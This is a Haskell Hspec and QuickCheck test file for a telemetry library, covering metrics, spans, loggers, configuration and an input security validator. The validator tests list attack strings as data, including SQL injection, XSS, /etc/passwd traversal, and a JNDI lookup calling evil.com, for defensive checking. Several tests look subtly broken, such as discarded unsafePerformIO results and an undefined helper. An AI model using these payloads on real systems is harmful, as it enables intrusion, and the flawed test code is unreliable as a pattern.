{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE ScopedTypeVariables #-}
{-# LANGUAGE BlockArguments #-}

module NewComprehensiveTestSpec (spec) where

import Test.Hspec
import Test.QuickCheck
import Control.Exception (try, SomeException, evaluate)
import Control.Monad (replicateM, replicateM_, when)
import qualified Data.Text as Text
import Data.Text (pack, unpack)
import System.IO.Unsafe (unsafePerformIO)
import Data.IORef
import Data.Char (isControl, isAscii)
import Data.List (isInfixOf)
import Azimuth.Telemetry

-- | Test metric arithmetic properties
spec :: Spec
spec = describe "New Comprehensive Tests" $ do
  
  -- Test 1: Metric arithmetic properties with QuickCheck
  describe "Metric Arithmetic Properties" $ do
    it "should satisfy additive property for positive numbers" $ property $
      \x y -> 
        let metric = unsafePerformIO $ createMetricWithInitialValue "test" "unit" 0.0
            _ = unsafePerformIO $ recordMetric metric x
            _ = unsafePerformIO $ recordMetric metric y
            result = unsafePerformIO $ metricValue metric
        in not (isNaN x) && not (isNaN y) && not (isInfinite x) && not (isInfinite y) ==> 
           abs (result - (x + y)) < 1.0e-9
    
    it "should handle zero correctly" $ property $
      \x ->
        let metric = unsafePerformIO $ createMetricWithInitialValue "zero-test" "unit" x
            _ = unsafePerformIO $ recordMetric metric 0.0
            result = unsafePerformIO $ metricValue metric
        in not (isNaN x) ==> result == x
    
    it "should preserve NaN values" $ do
      metric <- createMetric "nan-test" "unit"
      recordMetric metric (0/0)  -- NaN
      value <- metricValue metric
      isNaN value `shouldBe` True
    
    it "should handle infinity correctly" $ do
      metric <- createMetric "infinity-test" "unit"
      recordMetric metric (1/0)  -- Positive infinity
      value <- metricValue metric
      isInfinite value `shouldBe` True
      value > 0 `shouldBe` True

  -- Test 2: Span ID uniqueness properties
  describe "Span ID Uniqueness" $ do
    it "should generate unique span IDs" $ do
      spans <- replicateM 100 $ createSpan "test-span"
      let spanIds = map spanSpanId spans
      length spanIds `shouldBe` length (nub spanIds)
    
    it "should maintain trace ID consistency within a trace" $ do
      span1 <- createSpan "operation-1"
      span2 <- createSpan "operation-2"
      span3 <- createSpan "operation-3"
      
      -- All spans should have the same trace ID
      spanTraceId span1 `shouldBe` spanTraceId span2
      spanTraceId span2 `shouldBe` spanTraceId span3
    
    it "should generate valid hex strings for IDs" $ do
      span <- createSpan "test"
      let traceId = unpack $ spanTraceId span
          spanId = unpack $ spanSpanId span
      all (`elem` ("0123456789abcdef" :: String)) traceId `shouldBe` True
      all (`elem` ("0123456789abcdef" :: String)) spanId `shouldBe` True
  
  -- Test 3: Logger level filtering properties
  describe "Logger Level Filtering" $ do
    it "should handle all log levels correctly" $ do
      logger <- createLogger "level-test" Warn
      
      -- These should all execute without error regardless of level
      logMessage logger Debug (pack "debug message")
      logMessage logger Info (pack "info message")
      logMessage logger Warn (pack "warn message")
      logMessage logger Error (pack "error message")
      
      -- Just verify the logger properties haven't changed
      loggerName logger `shouldBe` pack "level-test"
      loggerLevel logger `shouldBe` Warn
    
    it "should maintain logger properties after logging" $ property $
      \level ->
        let validLevels = [Debug, Info, Warn, Error]
            testLevel = validLevels !! (abs level `mod` 4)
            logger = unsafePerformIO $ createLogger "property-test" testLevel
        in loggerName logger == pack "property-test" &&
           loggerLevel logger == testLevel

  -- Test 4: Configuration properties with QuickCheck
  describe "Configuration Properties" $ do
    it "should handle configuration transitions gracefully" $ do
      let config1 = defaultConfig
          config2 = productionConfig
      
      -- Initialize with default config
      initTelemetry config1
      
      -- Create metric
      metric <- createMetric "config-transition" "count"
      recordMetric metric 10.0
      
      -- Switch to production config
      initTelemetry config2
      
      -- Metric should still work
      recordMetric metric 20.0
      value <- metricValue metric
      value `shouldBe` 30.0
      
      shutdownTelemetry
    
    it "should preserve config fields after initialization" $ property $
      \(name :: String) (version :: String) ->
        let config = TelemetryConfig (pack name) (pack version) True False True False
        in unpack (serviceName config) == name &&
           unpack (serviceVersion config) == version &&
           enableMetrics config == True &&
           enableTracing config == False &&
           enableLogging config == True

  -- Test 5: Text handling properties
  describe "Text Handling Properties" $ do
    it "should handle unicode characters correctly" $ property $
      \text ->
        let packedText = pack text
            metric = unsafePerformIO $ createMetric packedText packedText
            logger = unsafePerformIO $ createLogger packedText Info
            span = unsafePerformIO $ createSpan packedText
        in metricName metric == packedText &&
           metricUnit metric == packedText &&
           loggerName logger == packedText &&
           spanName span == packedText
    
    it "should handle empty strings" $ do
      let emptyText = pack ""
      metric <- createMetric emptyText emptyText
      logger <- createLogger emptyText Info
      span <- createSpan emptyText
      
      metricName metric `shouldBe` emptyText
      metricUnit metric `shouldBe` emptyText
      loggerName logger `shouldBe` emptyText
      spanName span `shouldBe` emptyText
    
    it "should handle control characters" $ do
      let controlText = pack "\0\t\n\r\x1F"
      metric <- createMetric controlText (pack "control-unit")
      logger <- createLogger controlText Info
      span <- createSpan controlText
      
      metricName metric `shouldBe` controlText
      loggerName logger `shouldBe` controlText
      spanName span `shouldBe` controlText

  -- Test 6: Numeric boundary properties
  describe "Numeric Boundary Properties" $ do
    it "should handle extreme values" $ do
      metric <- createMetric "extreme-values" "test"
      
      -- Test very large positive number
      recordMetric metric 1.0e308
      value1 <- metricValue metric
      value1 > 1.0e307 `shouldBe` True
      
      -- Test very small negative number
      recordMetric metric (-1.0e308)
      value2 <- metricValue metric
      value2 < -1.0e307 `shouldBe` True
      
      -- Test very small positive number
      recordMetric metric 1.0e-308
      value3 <- metricValue metric
      value3 > 0.0 `shouldBe` True
    
    it "should handle special floating point values" $ do
      let specialValues = [0.0, -0.0, 1/0, -1/0, 0/0]
      results <- mapM (\value -> do
        metric <- createMetric "special-value" "test"
        recordMetric metric value
        metricValue metric
        ) specialValues
      
      -- Just verify all operations completed without error
      length results `shouldBe` length specialValues

  -- Test 7: Resource lifecycle properties
  describe "Resource Lifecycle Properties" $ do
    it "should handle multiple init/shutdown cycles" $ do
      let cycles = 10
      replicateM_ cycles $ do
        initTelemetry defaultConfig
        metric <- createMetric "lifecycle" "count"
        recordMetric metric 1.0
        shutdownTelemetry
    
    it "should maintain isolation between test runs" $ do
      -- First run
      initTelemetry defaultConfig
      metric1 <- createMetric "isolation-test" "count"
      recordMetric metric1 100.0
      shutdownTelemetry
      
      -- Second run
      initTelemetry defaultConfig
      metric2 <- createMetric "isolation-test" "count"
      value <- metricValue metric2
      value `shouldBe` 0.0  -- Should start fresh
      shutdownTelemetry

  -- Test 8: SimpleMetric algebraic properties
  describe "SimpleMetric Algebraic Properties" $ do
    it "should satisfy commutative property" $ property $
      \x y ->
        let metric = createSimpleMetric "test" "unit" 0.0
            metric1 = recordSimpleMetric metric x
            metric2 = recordSimpleMetric metric1 y
            result1 = simpleMetricValue metric2
            
            metric' = createSimpleMetric "test" "unit" 0.0
            metric1' = recordSimpleMetric metric' y
            metric2' = recordSimpleMetric metric1' x
            result2 = simpleMetricValue metric2'
        in not (isNaN x) && not (isNaN y) && not (isInfinite x) && not (isInfinite y) ==>
           abs (result1 - result2) < 1.0e-9
    
    it "should satisfy associative property" $ property $
      \x y z ->
        let metric = createSimpleMetric "test" "unit" 0.0
            metric1 = recordSimpleMetric metric x
            metric2 = recordSimpleMetric metric1 y
            metric3 = recordSimpleMetric metric2 z
            result1 = simpleMetricValue metric3
            
            metric' = createSimpleMetric "test" "unit" 0.0
            metric1' = recordSimpleMetric metric' y
            metric2' = recordSimpleMetric metric1' z
            metric3' = recordSimpleMetric metric2' x
            result2 = simpleMetricValue metric3'
        in not (isNaN x) && not (isNaN y) && not (isNaN z) && 
           not (isInfinite x) && not (isInfinite y) && not (isInfinite z) ==>
           abs (result1 - result2) < 1.0e-9
    
    it "should satisfy identity property" $ property $
      \x ->
        let metric = createSimpleMetric "test" "unit" x
            result = simpleMetricValue metric
        in not (isNaN x) ==> result == x

  -- Test 9: Security validator properties
  describe "Security Validator Properties" $ do
    it "should detect malicious patterns" $ do
      validator <- createSecurityValidator
      
      let maliciousInputs = 
            [ "'; DROP TABLE users"
            , "<script>alert('xss')</script>"
            , "javascript:void(0)"
            , "../../etc/passwd"
            , "{{7*7}}"
            , "${jndi:ldap://evil.com/a}"
            , "text\x00with\x01control\x02chars"
            ]
      
      results <- mapM (validateInput validator) maliciousInputs
      all (== False) results `shouldBe` True
    
    it "should allow safe inputs" $ property $
      \safeText ->
        let safeInput = pack $ filter (\c -> isAscii c && not (isControl c)) (take 100 safeText)
        in not (Text.null safeInput) ==> do
          validator <- createSecurityValidator
          isValid <- validateInput validator safeInput
          isValid `shouldBe` True
    
    it "should sanitize malicious inputs" $ do
      validator <- createSecurityValidator
      let maliciousInput = pack "text\x00with\x01control\x02chars"
      sanitized <- sanitizeInput validator maliciousInput
      Text.all (not . isControlChar) sanitized `shouldBe` True

  -- Test 10: Performance and stress properties
  describe "Performance and Stress Properties" $ do
    it "should handle high-frequency operations" $ do
      let numOperations = 1000
      metric <- createMetric "performance" "ops"
      
      -- Perform high-frequency operations
      replicateM_ numOperations $ recordMetric metric 1.0
      
      value <- metricValue metric
      value `shouldBe` fromIntegral numOperations
    
    it "should handle memory pressure" $ do
      let numMetrics = 100
      metrics <- replicateM numMetrics $ createMetric "memory-test" "count"
      
      -- Record values on all metrics
      sequence_ $ zipWith (\metric index -> recordMetric metric (fromIntegral index)) metrics [1..]
      
      -- Verify all metrics have correct values
      values <- sequence $ map metricValue metrics
      values `shouldBe` map fromIntegral [1..numMetrics]

-- Helper function to remove duplicates from a list
nub :: Eq a => [a] -> [a]
nub [] = []
nub (x:xs) = x : nub (filter (/= x) xs)
